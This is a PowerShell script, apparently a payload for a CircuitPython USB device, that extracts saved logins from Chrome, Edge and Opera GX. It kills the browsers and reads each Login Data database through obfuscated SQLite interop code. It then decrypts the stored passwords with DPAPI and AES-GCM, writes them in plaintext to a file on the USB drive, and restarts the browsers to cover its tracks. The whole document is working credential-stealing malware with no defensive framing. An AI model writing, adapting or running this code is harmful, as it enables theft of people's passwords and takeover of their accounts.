#########################################################################################################
#                                                                                                       #
# Title        : Multi-Browser Password Extractor                                                      #
# Description  : Extracts saved passwords from Chrome, Edge, and Opera GX                              #
# Saves        : DataMaster.txt on CIRCUITPY drive                                                     #
#########################################################################################################

# Find CIRCUITPY drive
$drive = Get-PSDrive -PSProvider FileSystem | Where-Object {
    $_.DisplayRoot -like "*CIRCUITPY*" -or $_.Root -and (Get-Volume -DriveLetter $_.Name).FileSystemLabel -eq "CIRCUITPY"
}

if (-not $drive) {
    Write-Error "CIRCUITPY drive not found. Make sure it's connected and not in use."
    exit
}

$FilePath = "$($drive.Root)DataMaster.txt"

# Target browser user data paths
$browserPaths = @{
    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    "Opera GX" = "$env:APPDATA\Opera Software\Opera GX Stable"
}

# Kill browsers
Stop-Process -Name chrome, msedge, opera -ErrorAction SilentlyContinue

# Setup for SQLite and decryption
$d = Add-Type -A System.Security
$p = 'public static'
$g = """)]$p extern"
$i = '[DllImport("winsqlite3",EntryPoint="sqlite3_'
$m = "[MarshalAs(UnmanagedType.LP"
$q = '(s,i)'
$f = '(p s,int i)'
$u = [Security.Cryptography.ProtectedData]

Add-Type "using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}"

# Collect credentials from all browsers
$l = @()
foreach ($browser in $browserPaths.GetEnumerator()) {
    $name = $browser.Key
    $path = $browser.Value
    $loginData = Join-Path $path "Default\Login Data"
    $localState = Join-Path $path "Local State"

    if (-Not (Test-Path $loginData)) { continue }

    $s = [W]::O($loginData, [ref]$d)

    $x = $null
    if (Test-Path $localState) {
        $b = (Get-Content $localState | ConvertFrom-Json).os_crypt.encrypted_key
        $x = [Security.Cryptography.AesGcm]::New($u::Unprotect([Convert]::FromBase64String($b)[5..($b.Length - 1)], $n, 0))
    }

    $_ = [W]::P($d, "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user=0", -1, [ref]$s, 0)

    for (; !([W]::S($s) % 100);) {
        $url = [W]::T($s, 0)
        $user = [W]::T($s, 1)
        $enc = [W]::B($s, 2)

        try {
            $dec = $u::Unprotect($enc, $n, 0)
        } catch {
            if ($x) {
                $k = $enc.Length
                $dec = [byte[]]::new($k - 31)
                $x.Decrypt($enc[3..14], $enc[15..($k - 17)], $enc[($k - 16)..($k - 1)], $dec)
            }
        }

        $pass = ($dec | ForEach-Object { [char]$_ }) -join ''
        $l += "`nBrowser: $name`nURL: $url`nUsername: $user`nPassword: $pass`n`n"
    }
}

# Save credentials to CIRCUITPY drive
$l | Out-File -Encoding ASCII -FilePath $FilePath -Force

# Restart browsers
Start-Process "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" -ErrorAction SilentlyContinue
Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ErrorAction SilentlyContinue
Start-Process "$env:APPDATA\Opera Software\Opera GX Stable\launcher.exe" -ErrorAction SilentlyContinue

exit
